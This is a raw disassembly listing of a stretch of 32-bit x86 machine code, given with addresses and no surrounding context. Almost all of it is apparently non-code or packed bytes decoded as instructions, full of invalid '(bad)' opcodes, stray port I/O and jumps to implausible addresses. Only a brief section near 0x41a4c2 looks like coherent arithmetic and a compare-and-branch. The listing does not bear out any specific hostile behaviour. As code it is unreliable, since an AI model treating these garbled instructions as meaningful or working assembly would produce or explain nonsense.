  41a15b:	and    al,0x22
  41a15d:	push   DWORD PTR [edx+0x65e6161e]
  41a163:	sbb    DWORD PTR [ebx],ebx
  41a165:	mov    bl,0xb0
  41a167:	xchg   esi,eax
  41a168:	cmp    esi,ebp
  41a16a:	enter  0x5e5c,0x1
  41a16e:	lahf   
  41a16f:	sahf   
  41a170:	arpl   dx,di
  41a172:	cmp    BYTE PTR [ebx+0x7f],bh
  41a175:	jne    0x41a1b8
  41a177:	and    BYTE PTR [edx+edi*8],0xd8
  41a17b:	sbb    bh,0xf4
  41a17e:	(bad)  
  41a17f:	and    BYTE PTR [edx+0x74],bl
  41a182:	pop    ebx
  41a183:	div    DWORD PTR [ebp-0x6c004ff4]
  41a189:	mov    al,ds:0x489d71ce
  41a18e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a18f:	push   edi
  41a190:	add    ah,BYTE PTR [ebx-0x58]
  41a193:	fiadd  DWORD PTR [eax]
  41a195:	mov    gs,WORD PTR [ebx]
  41a197:	and    eax,0x571b7f87
  41a19c:	outs   dx,DWORD PTR ds:[esi]
  41a19d:	out    dx,al
  41a19e:	cmp    ecx,esp
  41a1a0:	xchg   BYTE PTR [ecx],dh
  41a1a2:	dec    ecx
  41a1a3:	lods   eax,DWORD PTR ds:[esi]
  41a1a4:	ins    BYTE PTR es:[edi],dx
  41a1a5:	xor    edi,esp
  41a1a7:	mov    ah,0x6f
  41a1a9:	push   ecx
  41a1aa:	xor    ecx,DWORD PTR [eax-0x11]
  41a1ad:	enter  0x31c4,0xa7
  41a1b1:	sub    ebp,DWORD PTR [eax]
  41a1b3:	jecxz  0x41a223
  41a1b5:	out    dx,al
  41a1b6:	shl    BYTE PTR [eax-0x22929285],1
  41a1bc:	ja     0x41a175
  41a1be:	jbe    0x41a190
  41a1c0:	sbb    DWORD PTR [edi-0x1ce13813],edi
  41a1c6:	imul   ebp
  41a1c8:	or     DWORD PTR [ecx],ebp
  41a1ca:	adc    eax,DWORD PTR [esi]
  41a1cc:	mov    esi,0x54accc0b
  41a1d1:	sbb    dh,BYTE PTR [esi-0x83d37b6]
  41a1d7:	es xchg ebp,ecx
  41a1da:	sbb    al,0xd8
  41a1dc:	add    eax,0xab83229b
  41a1e1:	aas    
  41a1e2:	and    DWORD PTR [edi],0x75e7420b
  41a1e8:	cli    
  41a1e9:	ror    BYTE PTR [ecx-0x7f74b8ec],cl
  41a1ef:	mov    dl,0x4a
  41a1f1:	ret    0xa10f
  41a1f4:	sbb    ebp,eax
  41a1f6:	leave  
  41a1f7:	sbb    eax,0x93f8f5fb
  41a1fc:	fstp   DWORD PTR [ebx+ebp*8+0x23]
  41a200:	loop   0x41a267
  41a202:	imul   eax,DWORD PTR [eax-0x22dbdffc],0xc51a87d2
  41a20c:	or     eax,0xd2f94ea3
  41a211:	ficom  DWORD PTR [edx]
  41a213:	xchg   ebx,eax
  41a214:	push   cs
  41a215:	mov    dh,0x31
  41a217:	xor    eax,0x623dea19
  41a21c:	jl     0x41a291
  41a21e:	push   eax
  41a21f:	out    dx,al
  41a220:	dec    ebx
  41a221:	mov    ebp,0x2a863429
  41a226:	xchg   edi,eax
  41a227:	cmc    
  41a228:	pop    esp
  41a229:	scas   al,BYTE PTR es:[edi]
  41a22a:	jo     0x41a207
  41a22c:	int    0x3e
  41a22e:	out    0x72,eax
  41a230:	nop
  41a231:	aad    0xb7
  41a233:	icebp  
  41a234:	fmul   QWORD PTR [edx]
  41a236:	xchg   edi,eax
  41a237:	pop    eax
  41a238:	out    0x6,al
  41a23a:	mov    dl,al
  41a23c:	ds retf 
  41a23e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a23f:	int    0x62
  41a241:	lea    esp,[ebx+0x59a52434]
  41a247:	adc    al,0xf4
  41a249:	jae    0x41a22a
  41a24b:	mov    ebp,0x47640029
  41a250:	imul   ebp,DWORD PTR ds:0x644bbc46,0x4d
  41a257:	xor    esi,DWORD PTR [ecx-0x149c2f09]
  41a25d:	repz js 0x41a239
  41a260:	mov    es,WORD PTR [edi+0x2]
  41a263:	jae    0x41a1ef
  41a265:	push   edi
  41a266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a267:	fcom   st(2)
  41a269:	(bad)  
  41a26a:	js     0x41a20c
  41a26c:	mov    ebp,DWORD PTR [eax-0x53]
  41a26f:	inc    ebp
  41a270:	daa    
  41a271:	inc    edi
  41a272:	and    cl,ch
  41a274:	ss jmp 0x41a25b
  41a277:	jmp    0x41a201
  41a279:	xchg   ecx,eax
  41a27a:	iret   
  41a27b:	pop    eax
  41a27c:	lds    ebp,FWORD PTR [edi]
  41a27e:	pop    eax
  41a27f:	and    al,BYTE PTR [ebx-0x46373e45]
  41a285:	lahf   
  41a286:	mov    dl,0x4b
  41a288:	or     esp,esp
  41a28a:	mov    ds:0x5b2d4536,al
  41a28f:	data16 fiadd WORD PTR [esi]
  41a292:	mov    esi,0xff4e276e
  41a297:	cld    
  41a298:	arpl   WORD PTR [ebx],si
  41a29a:	(bad)  
  41a29b:	aam    0xdc
  41a29d:	adc    esp,0xb4d00183
  41a2a3:	mov    bh,0x6
  41a2a5:	jae    0x41a229
  41a2a7:	dec    ebx
  41a2a8:	ins    BYTE PTR es:[edi],dx
  41a2a9:	cs inc esi
  41a2ab:	sub    ch,dl
  41a2ad:	pop    edx
  41a2ae:	push   ebx
  41a2af:	xchg   esp,eax
  41a2b0:	ret    
  41a2b1:	xor    eax,DWORD PTR [ebx]
  41a2b3:	xor    ecx,esp
  41a2b5:	adc    DWORD PTR [edi+0x312c1109],ecx
  41a2bb:	adc    DWORD PTR [ebp+0x5d],eax
  41a2be:	inc    ebp
  41a2bf:	add    dl,BYTE PTR [edx+0x5010d49f]
  41a2c5:	retf   0xbea5
  41a2c8:	xor    eax,0x40340391
  41a2cd:	aam    0xce
  41a2cf:	pop    ecx
  41a2d0:	push   ebx
  41a2d1:	jge    0x41a25c
  41a2d3:	pop    ecx
  41a2d4:	je     0x41a269
  41a2d6:	lds    ebx,FWORD PTR [ebp+0x5f]
  41a2d9:	aas    
  41a2da:	or     DWORD PTR [edi],0x96a9e8e8
  41a2e0:	sub    DWORD PTR [edx-0x10],edx
  41a2e3:	test   BYTE PTR [edi+0x72],ch
  41a2e6:	fsubr  DWORD PTR [ebp-0x6a371934]
  41a2ec:	jge    0x41a2a9
  41a2ee:	enter  0xe02c,0x47
  41a2f2:	push   esi
  41a2f3:	and    DWORD PTR [esi+eiz*4+0x696770ac],0x19
  41a2fb:	popf   
  41a2fc:	mov    eax,ds:0x4d498c97
  41a301:	mov    ebx,0xda96cd6f
  41a306:	xchg   ecx,eax
  41a307:	dec    eax
  41a308:	loop   0x41a352
  41a30a:	jnp    0x41a32f
  41a30c:	push   ds
  41a30d:	repnz pop eax
  41a30f:	push   eax
  41a310:	pop    esi
  41a311:	scas   al,BYTE PTR es:[edi]
  41a312:	mov    eax,0x9c654b5b
  41a317:	cmc    
  41a318:	daa    
  41a319:	push   eax
  41a31a:	jnp    0x41a312
  41a31c:	sbb    al,0x44
  41a31e:	fmulp  st(2),st
  41a320:	adc    eax,0x3f00dfb
  41a325:	lea    esp,[edi-0x58]
  41a328:	mov    ds:0x9c77f697,al
  41a32d:	sbb    si,WORD PTR [edx+0x16]
  41a331:	in     al,0x45
  41a333:	bnd jne 0x41a2bd
  41a336:	lea    edx,[edx-0x75]
  41a339:	mov    BYTE PTR [esi+0x3],dl
  41a33c:	sub    DWORD PTR [ebp-0x489b5a84],ecx
  41a342:	mov    ecx,0x243245cf
  41a347:	je     0x41a333
  41a349:	imul   ebx,eax,0xcf2c5f62
  41a34f:	sbb    ebx,esp
  41a351:	cmp    dl,BYTE PTR [ecx+0x5b3adf91]
  41a357:	int    0x8e
  41a359:	dec    ebx
  41a35a:	pop    esi
  41a35b:	fcom   QWORD PTR [edi+0x1e1eea]
  41a361:	test   al,0x95
  41a363:	out    dx,eax
  41a364:	aad    0x44
  41a366:	cdq    
  41a367:	push   edx
  41a368:	adc    DWORD PTR [eax+0x382aa793],ebx
  41a36e:	sub    edx,esi
  41a370:	aam    0xd8
  41a372:	enter  0x2c76,0x4f
  41a376:	das    
  41a377:	mov    cl,0x72
  41a379:	mov    bl,0x30
  41a37b:	int3   
  41a37c:	bound  edx,QWORD PTR [ecx+esi*4-0x76]
  41a380:	inc    ecx
  41a381:	inc    edi
  41a382:	outs   dx,DWORD PTR ds:[esi]
  41a383:	sub    al,dh
  41a385:	sahf   
  41a386:	push   esi
  41a387:	das    
  41a388:	std    
  41a389:	push   ebx
  41a38a:	fld    QWORD PTR [edi]
  41a38c:	out    dx,al
  41a38d:	xchg   DWORD PTR [ecx],ebp
  41a38f:	pop    ecx
  41a390:	mov    bl,0xbf
  41a392:	and    al,0xc9
  41a394:	(bad)  
  41a395:	mov    cl,0xb5
  41a397:	push   ds
  41a398:	ficom  DWORD PTR ds:0x599fa6e
  41a39e:	nop
  41a39f:	hlt    
  41a3a0:	arpl   WORD PTR [edi-0x7e1cc5d4],cx
  41a3a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3a8:	add    ch,ah
  41a3aa:	out    0xde,eax
  41a3ac:	push   edi
  41a3ad:	sub    BYTE PTR [esi-0x15],cl
  41a3b0:	fdiv   QWORD PTR [ebx+0x547787ef]
  41a3b6:	out    0x2d,eax
  41a3b8:	aad    0x1
  41a3ba:	jmp    0x41a402
  41a3bc:	iret   
  41a3bd:	xlat   BYTE PTR ds:[ebx]
  41a3be:	push   ss
  41a3bf:	mov    ch,BYTE PTR [esi-0x3]
  41a3c2:	jp     0x41a36d
  41a3c4:	sbb    al,0x88
  41a3c6:	pop    ecx
  41a3c7:	inc    ecx
  41a3c8:	and    al,0x18
  41a3ca:	mov    ebx,0x69f932d3
  41a3cf:	cmp    DWORD PTR [edi+0x13],esi
  41a3d2:	fistp  DWORD PTR [esi+0x34]
  41a3d5:	cmp    DWORD PTR [ecx-0x77],eax
  41a3d8:	mov    edx,0x8f78bcf3
  41a3dd:	cmp    al,0x60
  41a3df:	test   BYTE PTR ds:0xf9bf73e1,ch
  41a3e5:	retf   
  41a3e6:	pop    ebp
  41a3e7:	in     eax,dx
  41a3e8:	dec    eax
  41a3e9:	mov    cl,0x81
  41a3eb:	or     bl,BYTE PTR [eax-0x11]
  41a3ee:	xlat   BYTE PTR ds:[ebx]
  41a3ef:	test   eax,0x6d962850
  41a3f5:	push   0xffffffee
  41a3f7:	std    
  41a3f8:	xor    DWORD PTR [eax+ebp*8+0x5d],ebx
  41a3fc:	dec    ebx
  41a3fd:	fwait
  41a3fe:	pop    ecx
  41a3ff:	inc    edx
  41a400:	(bad)  
  41a401:	jmp    0x64ba23ec
  41a406:	aas    
  41a407:	cmp    ch,BYTE PTR [ebp-0x77]
  41a40a:	leave  
  41a40b:	mov    ebx,0x6a77f4ed
  41a410:	scas   eax,DWORD PTR es:[edi]
  41a411:	pusha  
  41a412:	retf   
  41a413:	popf   
  41a414:	ins    BYTE PTR es:[edi],dx
  41a415:	xchg   ecx,eax
  41a416:	add    esi,DWORD PTR [esi+ebx*2-0x19]
  41a41a:	test   DWORD PTR [eax-0x46],ecx
  41a41d:	sbb    eax,0xe1cb73dd
  41a422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a423:	mov    cl,dh
  41a425:	inc    ebx
  41a426:	mov    BYTE PTR [ebx-0x78839c89],0x7a
  41a42d:	(bad)  
  41a42f:	inc    edi
  41a430:	xor    DWORD PTR [ecx+ecx*2],eax
  41a433:	dec    ecx
  41a434:	xchg   esi,eax
  41a435:	lods   eax,DWORD PTR ds:[esi]
  41a436:	inc    esi
  41a437:	xchg   esp,eax
  41a438:	cld    
  41a439:	inc    esi
  41a43a:	mov    ds,WORD PTR [esi+ebx*2+0x52]
  41a43e:	clc    
  41a43f:	adc    DWORD PTR [bx+di+0x4c20],ebp
  41a444:	mov    al,0xaf
  41a446:	push   esp
  41a447:	out    dx,al
  41a448:	inc    eax
  41a449:	dec    ebx
  41a44a:	pop    ecx
  41a44b:	ficom  WORD PTR [edi-0x2a]
  41a44e:	mov    al,0xb4
  41a450:	jl     0x41a496
  41a452:	ja     0x41a46c
  41a454:	jnp    0x41a4a2
  41a456:	outs   dx,BYTE PTR ds:[esi]
  41a457:	dec    ebx
  41a458:	mov    edx,0x5fb95b9e
  41a45d:	inc    edx
  41a45e:	jo     0x41a46a
  41a460:	out    0x18,eax
  41a462:	add    al,0x69
  41a464:	shr    BYTE PTR [ebx+0x64e20191],0x73
  41a46b:	push   ds
  41a46c:	mov    ch,0x4b
  41a46e:	dec    DWORD PTR [eax-0x34]
  41a471:	xchg   ebx,eax
  41a472:	pusha  
  41a473:	cmp    BYTE PTR [eax+0x2d],0x22
  41a477:	fs ret 
  41a479:	aas    
  41a47a:	and    ch,dh
  41a47c:	cwd    
  41a47e:	mov    ds:0x9ef0330a,eax
  41a483:	and    eax,0xb8a6ce5f
  41a488:	(bad)  
  41a48b:	out    0xda,eax
  41a48d:	cmp    ch,BYTE PTR [ebp+0x67]
  41a490:	mul    dh
  41a492:	inc    ebp
  41a493:	aad    0xd9
  41a495:	loopne 0x41a4cf
  41a497:	push   esi
  41a498:	sbb    BYTE PTR [ebp+0x2af78b4c],0x48
  41a49f:	rcl    DWORD PTR [edx+0x57c7d1f5],1
  41a4a5:	inc    ebx
  41a4a6:	mov    bl,0xc8
  41a4a8:	mov    ah,0x85
  41a4aa:	sub    edi,esi
  41a4ac:	add    DWORD PTR [esi+0x2],ecx
  41a4af:	rcl    DWORD PTR [esi],1
  41a4b1:	out    dx,al
  41a4b2:	in     eax,0x54
  41a4b4:	xor    esi,edx
  41a4b6:	add    eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8-0x745bd455]
  41a500:	inc    edi
  41a501:	dec    eax
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx+0x54]
  41a50a:	pop    esp
  41a50b:	cmp    al,dl
  41a50d:	rol    DWORD PTR [eax-0x24],cl
  41a510:	aaa    
  41a511:	xchg   edi,eax
  41a512:	mov    edi,0xa40b082
  41a517:	and    DWORD PTR [ebx+edx*8-0x723726d2],ebx
  41a51e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a51f:	rcl    BYTE PTR [ecx-0x22],0xf0
  41a523:	pushf  
  41a524:	lea    esp,[eax+0x3e02e9e3]
  41a52a:	test   BYTE PTR ds:0x98042e68,cl
  41a530:	jle    0x41a4fc
  41a532:	pop    edi
  41a533:	push   0x46
  41a535:	adc    eax,0x21b5ab3
  41a53a:	cli    
  41a53b:	fadd   QWORD PTR [esp+esi*2-0x4e]
  41a53f:	(bad)  
  41a541:	div    ebp
  41a543:	data16 int 0x52
  41a546:	repnz sar BYTE PTR [eax+0xf610661],cl
  41a54d:	pop    es
  41a54e:	arpl   WORD PTR [eax],di
  41a550:	into   
  41a551:	inc    esi
  41a552:	xlat   BYTE PTR ds:[ebx]
  41a553:	mov    ch,0x58
  41a555:	stos   BYTE PTR es:[edi],al
  41a556:	(bad)  
  41a557:	mov    eax,0x44e65503
  41a55c:	jmp    0x41a565
  41a55e:	int3   
  41a55f:	xchg   ebx,eax
  41a560:	jmp    0x65a44232
  41a565:	push   cs
  41a566:	or     BYTE PTR [ebp-0x31],cl
  41a569:	in     eax,dx
  41a56a:	call   0x15bd5e3b
  41a56f:	jno    0x41a538
  41a571:	dec    esp
  41a572:	lahf   
  41a573:	(bad)  
  41a574:	or     BYTE PTR [ecx-0x48],0x2
  41a578:	test   DWORD PTR [ebp*1+0x53efc0be],edi
  41a57f:	out    dx,eax
  41a580:	outs   dx,DWORD PTR ds:[esi]
  41a581:	cmp    al,bl
  41a583:	or     DWORD PTR [eax-0x3eac232f],esp
  41a589:	jnp    0x41a5ce
  41a58b:	xchg   esi,eax
  41a58c:	dec    edx
  41a58d:	icebp  
  41a58e:	xlat   BYTE PTR ds:[ebx]
  41a58f:	fnstcw WORD PTR [ebp+0xc]
  41a592:	jb     0x41a5d5
  41a594:	and    al,0xeb
  41a596:	or     eax,0x44391511
  41a59b:	jle    0x41a5e4
  41a59d:	mov    bh,0xbb
  41a59f:	mov    al,ds:0xc8530bff
  41a5a4:	mov    dl,0xd5
  41a5a6:	jecxz  0x41a53d
  41a5a8:	int3   
  41a5a9:	adc    eax,0xcd23be5
  41a5ae:	cwde   
  41a5af:	bound  edi,QWORD PTR [ecx+0x370343ea]
  41a5b5:	adc    al,0x6f
  41a5b7:	mov    cl,0x8f
  41a5b9:	cmc    
  41a5ba:	stos   DWORD PTR es:[edi],eax
  41a5bb:	retf   
  41a5bc:	push   esi
  41a5bd:	ins    DWORD PTR es:[edi],dx
  41a5be:	sub    DWORD PTR [edx-0x858947f],ecx
  41a5c4:	in     eax,dx
  41a5c5:	jl     0x41a567
  41a5c7:	loopne 0x41a54f
  41a5c9:	inc    eax
  41a5ca:	in     al,0x2c
  41a5cc:	mov    ebx,0xe1288511
  41a5d1:	(bad)  
  41a5d2:	mov    esp,0x9d3f684c
  41a5d7:	sub    eax,0x64a8ff56
  41a5dc:	push   eax
  41a5dd:	sbb    al,0xda
  41a5df:	pop    ss
  41a5e0:	inc    edx
  41a5e1:	xchg   edi,eax
  41a5e2:	sbb    edx,edx
  41a5e4:	jle    0x41a598
  41a5e6:	jmp    0x3c9f:0xebff77e8
  41a5ed:	push   ecx
  41a5ee:	xor    edi,0x72
  41a5f1:	repz push 0xffffffa7
  41a5f4:	int    0x24
  41a5f6:	in     eax,0x7d
  41a5f8:	jb     0x41a66b
  41a5fa:	retf   0x8a8
  41a5fd:	(bad)  
  41a5fe:	jmp    0xaa5f:0x34841735
  41a605:	inc    eax
  41a606:	out    0x22,eax
  41a608:	ins    DWORD PTR es:[edi],dx
  41a609:	imul   ecx,DWORD PTR [ecx-0x3],0xffffffee
  41a60d:	mov    al,0x65
  41a60f:	das    
  41a610:	mov    al,ds:0x7353de68
  41a615:	out    0x5a,al
  41a617:	xor    esp,DWORD PTR [esi+esi*1]
  41a61a:	mov    cl,0x12
  41a61c:	out    0xee,al
  41a61e:	(bad)  
  41a61f:	das    
  41a620:	gs inc edi
  41a622:	inc    ebp
  41a623:	mov    bl,0xb1
  41a625:	mov    bh,0x1b
  41a627:	aaa    
  41a628:	xchg   BYTE PTR [esi+0x4b],dl
  41a62b:	mov    BYTE PTR [eax],dl
  41a62d:	mov    ?,edx
  41a62f:	pop    ecx
  41a630:	inc    eax
  41a631:	je     0x41a5fd
  41a633:	xchg   DWORD PTR [ecx-0x3e],ebp
  41a636:	ror    DWORD PTR [ebx],0x6c
  41a639:	xor    DWORD PTR [ebp+0x8260700],esp
  41a63f:	ffreep st(3)
  41a641:	xchg   ebx,eax
  41a642:	push   ecx
  41a643:	mov    cl,0x53
  41a645:	cs mov esi,0xffc1dfab
  41a64b:	pop    cx
  41a64d:	lods   al,BYTE PTR ds:[esi]
  41a64e:	jge    0x41a5df
  41a650:	int3   
  41a651:	xchg   edx,eax
  41a652:	(bad)  
  41a653:	jb     0x41a5dd
  41a655:	jb     0x41a699
  41a657:	test   eax,0xe3f40731
  41a65c:	jle    0x41a6d8
  41a65e:	or     edx,DWORD PTR [ebx]
  41a660:	int    0xe6
  41a662:	aam    0xcb
  41a664:	and    BYTE PTR [eax],bh
  41a666:	sbb    eax,0xd5bceb5e
  41a66b:	xor    ecx,DWORD PTR [esi+0x70]
  41a66e:	mov    eax,0x2098a931
  41a673:	mov    dl,0x92
  41a675:	sub    ebx,DWORD PTR [ebx-0x6c2e9f1b]
  41a67b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a67c:	sub    ebx,DWORD PTR [ecx-0x3f]
  41a67f:	daa    
  41a680:	mov    eax,DWORD PTR [edx]
  41a682:	inc    edx
  41a683:	pop    ebp
  41a684:	test   al,0x5a
  41a686:	or     ebp,ebx
  41a688:	fcom   QWORD PTR [esi]
  41a68a:	jecxz  0x41a679
  41a68c:	outs   dx,DWORD PTR ds:[esi]
  41a68d:	fisub  WORD PTR [esi+ebx*4]
  41a690:	in     eax,0x39
  41a692:	jb     0x41a700
  41a694:	push   eax
  41a695:	or     edi,DWORD PTR [ebx]
  41a697:	mov    bl,0x91
  41a699:	adc    BYTE PTR [esi],0x2e
  41a69c:	js     0x41a699
  41a69e:	cli    
  41a69f:	and    dh,cl
  41a6a1:	in     eax,0x98
  41a6a3:	fadd   st(4),st
  41a6a5:	popf   
  41a6a6:	sahf   
  41a6a7:	int3   
  41a6a8:	add    ch,dh
  41a6aa:	sub    BYTE PTR [ecx-0x308fab03],cl
  41a6b0:	sar    ebp,0xe
  41a6b3:	jmp    0xf040:0xab3687b5
  41a6ba:	scas   al,BYTE PTR es:[edi]
  41a6bb:	xchg   ebx,eax
  41a6bc:	mov    edi,DWORD PTR [edx+0x51ed987f]
  41a6c2:	and    al,0x56
  41a6c4:	jle    0x41a6c9
  41a6c6:	inc    eax
  41a6c7:	outs   dx,DWORD PTR ds:[esi]
  41a6c8:	in     eax,dx
  41a6c9:	cmp    ecx,DWORD PTR [edx]
  41a6cb:	aas    
  41a6cc:	sbb    BYTE PTR [eax],ah
  41a6ce:	shl    edx,cl
  41a6d0:	(bad)  
  41a6d1:	mov    eax,ds:0xa4ff7c41
  41a6d6:	nop
  41a6d7:	out    dx,al
  41a6d8:	mov    bl,0xa6
  41a6da:	icebp  
  41a6db:	pop    esi
  41a6dc:	call   0xdf8a:0x6c12416c
  41a6e3:	nop
  41a6e4:	repnz adc BYTE PTR ds:0x34d19a4b,bl
  41a6eb:	lahf   
  41a6ec:	inc    ebx
  41a6ed:	rcl    DWORD PTR [ebx],1
  41a6ef:	ja     0x41a725
  41a6f1:	ja     0x41a68e
  41a6f3:	aas    
  41a6f4:	mov    ecx,?
  41a6f6:	cli    
  41a6f7:	es loop 0x41a707
  41a6fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6fb:	in     eax,0x73
  41a6fd:	call   0x34164716
  41a702:	inc    ebx
  41a703:	cli    
  41a704:	mov    dh,0x5a
  41a706:	dec    eax
  41a707:	aas    
  41a708:	rol    DWORD PTR [ebp+0x16],cl
  41a70b:	mov    bh,0xb5
  41a70e:	xchg   DWORD PTR [eax],edi
  41a710:	into   
  41a711:	mov    edx,0xe984e058
  41a716:	cmp    BYTE PTR [esi-0x1a],0x57
  41a71a:	fistp  DWORD PTR [ebx+0x3d]
  41a71d:	pop    edi
  41a71e:	jbe    0x41a6eb
  41a720:	dec    DWORD PTR [esi]
  41a722:	xchg   ebx,eax
  41a723:	ficom  DWORD PTR [ebx]
  41a725:	ret    
  41a726:	test   al,0xcc
  41a728:	inc    ecx
  41a729:	mov    esi,0x8dcffa88
  41a72e:	ds lock push es
  41a731:	xchg   DWORD PTR [edx-0x677b4cac],ebx
  41a737:	inc    esi
  41a738:	aas    
  41a739:	and    al,0xbf
  41a73b:	lahf   
  41a73c:	(bad)  
  41a73d:	mov    edi,0x48613cb0
  41a742:	and    dh,BYTE PTR [edx+0x26]
  41a745:	xchg   DWORD PTR [edx],ebx
  41a747:	dec    esi
  41a748:	pop    edx
  41a749:	bound  edi,QWORD PTR [eax]
  41a74b:	cmc    
  41a74c:	mov    ch,0x99
  41a74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74f:	pop    esp
  41a750:	enter  0x887d,0xca
  41a754:	adc    DWORD PTR [eax],ebp
  41a756:	and    eax,DWORD PTR [esi+0x17]
  41a759:	mov    DWORD PTR [edx+eax*8-0x42],ebx
  41a75d:	push   esp
  41a75e:	call   0xbfd7:0xd8199f30
  41a765:	lahf   
  41a766:	mov    ebx,0x4feeb483
  41a76b:	add    dh,BYTE PTR [eax]
  41a76d:	xchg   ecx,eax
  41a76e:	enter  0x9a8f,0x7d
  41a772:	inc    ebx
  41a773:	imul   edi,DWORD PTR [ebx-0x1ecc67fd],0x1baba686
  41a77d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a77e:	mov    al,0x54
  41a780:	adc    eax,0x3b60d4ec
  41a785:	pop    ebx
  41a786:	(bad)  
  41a787:	xor    edx,DWORD PTR [edx-0x6d]
  41a78a:	gs loope 0x41a7c5
  41a78d:	dec    ebp
  41a78e:	icebp  
  41a78f:	daa    
  41a790:	imul   edi,DWORD PTR [edx],0x42
  41a793:	ret    0x28b7
  41a796:	push   esp
  41a797:	pop    edx
  41a798:	xchg   esp,eax
  41a799:	outs   dx,BYTE PTR ds:[esi]
  41a79a:	xchg   esp,eax
  41a79b:	in     eax,dx
  41a79c:	xchg   ecx,eax
  41a79d:	or     ecx,esi
  41a79f:	repnz fcmovbe st,st(5)
  41a7a2:	add    eax,0x7388680
  41a7a7:	mov    bh,0xd7
  41a7a9:	or     eax,0xe2278f47
  41a7ae:	jbe    0x41a811
  41a7b0:	adc    eax,0x107d30d9
  41a7b5:	bound  edi,QWORD PTR [edi-0x7f0f956b]
  41a7bb:	and    DWORD PTR [eax-0x13],edx
  41a7be:	lea    edi,[ebp+edx*1-0x42]
  41a7c2:	out    dx,eax
  41a7c3:	add    esp,DWORD PTR [eax-0x7f65e5f1]
  41a7c9:	clc    
  41a7ca:	jp     0x41a82a
  41a7cc:	pushf  
  41a7cd:	ja     0x41a81e
  41a7cf:	(bad)  
  41a7d0:	(bad)  
  41a7d1:	div    DWORD PTR [eax+eax*2+0x35703cd2]
  41a7d8:	aam    0x73
  41a7da:	pushf  
  41a7db:	sub    BYTE PTR cs:[edx],dl
  41a7de:	je     0x41a76e
  41a7e0:	cmp    DWORD PTR [esi+eax*2-0x21],eax
  41a7e4:	xor    esi,esi
  41a7e6:	xor    DWORD PTR [esi-0x4ef85d15],ecx
  41a7ec:	jbe    0x41a80e
  41a7ee:	mov    bl,0x79
  41a7f0:	xchg   edi,eax
  41a7f1:	jle    0x41a78f
  41a7f3:	adc    DWORD PTR [esi],0xffffffaf
  41a7f6:	push   ecx
  41a7f7:	dec    esi
  41a7f8:	mov    edi,DWORD PTR [ebx+0x4b]
  41a7fb:	std    
  41a7fc:	inc    edx
  41a7fd:	pop    edx
  41a7fe:	xlat   BYTE PTR ds:[ebx]
  41a7ff:	ret    
  41a800:	outs   dx,BYTE PTR ds:[esi]
  41a801:	fbld   TBYTE PTR [edx]
  41a803:	sbb    esi,edi
  41a805:	mov    bl,0x68
  41a807:	fnstcw WORD PTR [esi]
  41a809:	scas   al,BYTE PTR es:[edi]
  41a80a:	jns    0x41a816
  41a80c:	call   0xc1a16ec8
  41a811:	or     DWORD PTR [esi-0x7a627176],0xffffff87
  41a818:	pop    ecx
  41a819:	(bad)  
  41a81a:	shl    DWORD PTR [edx+0x1b],1
  41a81d:	mov    ds:0x2509b147,eax
  41a822:	adc    eax,0xbdf332
  41a827:	pop    edx
  41a828:	pop    esp
  41a829:	imul   esp,DWORD PTR [edi],0xfffffff3
  41a82c:	sub    BYTE PTR [esi+0x43],0xe2
  41a830:	or     al,0xf1
  41a832:	repnz add dl,BYTE PTR [ecx-0x61]
  41a836:	clc    
  41a837:	add    al,0xf
  41a839:	test   eax,0xf113dc8a
  41a83e:	aas    
  41a83f:	sub    eax,0xb6412067
  41a844:	bound  esp,QWORD PTR [ecx]
  41a846:	inc    edx
  41a847:	cmp    eax,0x50ae90a8
  41a84c:	xor    BYTE PTR ds:0xc398b239,ch
  41a852:	push   es
  41a853:	mov    al,ds:0x506faddf
  41a858:	adc    DWORD PTR [esi],esp
  41a85a:	fimul  WORD PTR [edx-0xb3874c9]
  41a860:	pusha  
  41a861:	outs   dx,DWORD PTR ds:[esi]
  41a862:	fs xchg edi,eax
  41a864:	shl    al,0x92
  41a867:	imul   edi,DWORD PTR [ebx+0x6e4625b7],0xffffffb6
  41a86e:	and    al,0x73
  41a870:	mov    bl,0x4
  41a872:	push   es
  41a873:	xchg   edx,eax
  41a874:	popaw  
  41a876:	mov    WORD PTR [ecx+0x51242891],ss
  41a87c:	ja     0x41a88b
  41a87e:	cmp    al,BYTE PTR [ecx]
  41a880:	jno    0x41a804
  41a882:	or     al,0x42
  41a884:	loopne 0x41a826
  41a886:	(bad)  
  41a887:	std    
  41a888:	mov    esi,0x94fa0408
  41a88d:	repnz pop edx
  41a88f:	inc    esp
  41a890:	push   ss
  41a891:	xchg   ebx,eax
  41a892:	adc    BYTE PTR [edx],al
  41a894:	add    BYTE PTR [edi+0x60],bl
  41a897:	test   al,0x83
  41a899:	push   edx
  41a89a:	aad    0x4b
  41a89c:	rcl    DWORD PTR [esi],0x9a
